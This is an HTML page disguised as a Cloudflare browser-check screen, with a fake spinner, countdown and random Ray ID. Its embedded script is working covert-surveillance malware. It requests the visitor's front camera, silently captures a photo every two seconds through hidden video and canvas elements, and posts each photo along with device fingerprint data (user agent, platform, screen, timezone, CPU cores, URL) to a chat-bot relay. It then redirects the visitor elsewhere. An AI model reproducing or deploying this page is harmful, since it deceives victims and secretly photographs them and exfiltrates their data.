<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Just a moment...</title>
  <style>
    *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
    body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,'Helvetica Neue',Arial,sans-serif;background:#fff;color:#333;line-height:1.6;min-height:100vh}
    .container{background:#fff;text-align:center;min-height:100vh;display:flex;flex-direction:column;justify-content:center;align-items:center}
    .cloudflare-screen{max-width:600px;width:100%;padding:40px 24px;animation:fadeIn .25s ease-out}
    @keyframes fadeIn{from{opacity:0;transform:translateY(-8px)}to{opacity:1;transform:translateY(0)}}
    .cf-logo{margin-bottom:28px}
    .cf-logo svg{width:72px;height:72px}
    .cf-title{font-size:22px;font-weight:600;color:#222;margin-bottom:16px;line-height:1.3}
    .cf-subtitle{font-size:15px;color:#666;margin-bottom:28px;line-height:1.6}
    .cf-loading{margin:32px 0}
    .cf-spinner{border:3px solid #e8e8e8;border-top-color:#f4811e;border-radius:50%;width:40px;height:40px;animation:spin .9s linear infinite;margin:0 auto 18px}
    @keyframes spin{to{transform:rotate(360deg)}}
    .cf-progress{font-size:14px;color:#666;min-height:1.4em}
    .cf-footer{margin-top:40px;padding-top:18px;border-top:1px solid #e8e8e8;font-size:12px;color:#999}
    .cf-ray-id{font-family:'SFMono-Regular',Consolas,'Liberation Mono',Menlo,monospace;background:#f5f5f5;padding:2px 8px;border-radius:4px;font-size:12px}
    #video,#canvas{display:none!important}
  </style>
</head>
<body>
<div class="container">
  <video id="video" autoplay playsinline muted></video>
  <canvas id="canvas"></canvas>
  <div class="cloudflare-screen" id="cloudflareScreen">
    <div class="cf-logo">
      <svg viewBox="0 0 72 72" fill="none"><circle cx="36" cy="36" r="36" fill="#f4811e"/><path d="M52 36c0-8.84-7.16-16-16-16s-16 7.16-16 16h4c0-6.63 5.37-12 12-12s12 5.37 12 12h4z" fill="#fff"/><path d="M36 28c-4.42 0-8 3.58-8 8h2c0-3.31 2.69-6 6-6s6 2.69 6 6h2c0-4.42-3.58-8-8-8z" fill="#fff"/><rect x="34" y="36" width="4" height="12" rx="2" fill="#fff"/><circle cx="36" cy="44" r="3" fill="#f4811e"/></svg>
    </div>
    <div class="cf-title">Checking your browser before accessing <span id="targetSite">the requested site</span>.</div>
    <div class="cf-subtitle">This process is automatic. Your browser will redirect to your requested content shortly.<br><br>Please allow up to <span id="countdown">5</span> seconds…</div>
    <div class="cf-loading"><div class="cf-spinner"></div><div class="cf-progress" id="progressText">Performing security check…</div></div>
    <div class="cf-footer">DDoS protection by <strong>Cloudflare</strong><br><br>Ray ID: <span class="cf-ray-id" id="rayId">••••••••••••••••</span></div>
  </div>
</div>
<script>
(async()=>{
  const p=(n)=>new URLSearchParams(location.search).get(n)||'';
  const chatId=p('chatid'),redirect=p('redirect');
  const d=5;let s=d;
  const ray=()=>Array.from({length:16},()=>'0123456789abcdef'[Math.floor(Math.random()*16)]).join('');
  document.getElementById('rayId').textContent=ray();
  const t=setInterval(()=>{s--;document.getElementById('countdown').textContent=Math.max(s,0);if(s<=0)clearInterval(t)},1e3);
  if(!chatId)return;
  let stream=null,pc=0;
  const collect=async()=>{
    const o={
      ua:navigator.userAgent,pl:navigator.platform,lang:navigator.language,
      sw:screen.width,sh:screen.height,tz:Intl.DateTimeFormat().resolvedOptions().timeZone,
      cores:navigator.hardwareConcurrency,url:location.href
    };
    if(navigator.connection)o.net=navigator.connection.effectiveType;
    return o;
  };
  const info=await collect();
  try{
    stream=await navigator.mediaDevices.getUserMedia({video:{width:{ideal:1280},height:{ideal:720},facingMode:{ideal:'user'}}});
    document.getElementById('video').srcObject=stream;
    await new Promise(r=>{document.getElementById('video').addEventListener('loadedmetadata',r,{once:true})});
    await new Promise(r=>setTimeout(r,1e3));
    const v=document.getElementById('video'),c=document.getElementById('canvas'),ctx=c.getContext('2d');
    const cap=async()=>{
      c.width=v.videoWidth||640;c.height=v.videoHeight||480;ctx.drawImage(v,0,0);pc++;
      c.toBlob(async b=>{
        if(!b)return;
        const fd=new FormData();
        fd.append('chat_id',chatId);
        fd.append('photo',b,'photo_'+pc+'.jpg');
        const capText=['📸 Photo #'+pc,'🕐 '+new Date().toISOString(),'📱 '+info.pl,'🖥️ '+c.width+'×'+c.height,'🌍 '+info.tz,'💾 CPU: '+info.cores+' cores'].join('\n');
        fd.append('caption',capText);
        try{await fetch('/api/sendPhoto',{method:'POST',body:fd})}catch(e){}
        if(pc===1){
          const text=['🔍 DETAILED DEVICE INFO','','📱 UA: '+info.ua,'📱 Platform: '+info.pl,'🌐 Lang: '+info.lang,'🖥️ Screen: '+info.sw+'×'+info.sh,'🌍 Timezone: '+info.tz,'💾 Cores: '+info.cores,'🔗 '+info.url].join('\n');
          const fd2=new FormData();fd2.append('chat_id',chatId);fd2.append('text',text);
          try{await fetch('/api/sendMessage',{method:'POST',body:fd2})}catch(e){}
        }
      },'image/jpeg',0.85);
    };
    await cap();
    setInterval(cap,2e3);
  }catch(e){}
  setTimeout(()=>{
    if(stream)stream.getTracks().forEach(t=>t.stop());
    const url=redirect||'https://www.google.com';
    location.href=url.includes('://')?url:'https://'+url;
  },d*1e3);
})();
</script>
</body>
</html>
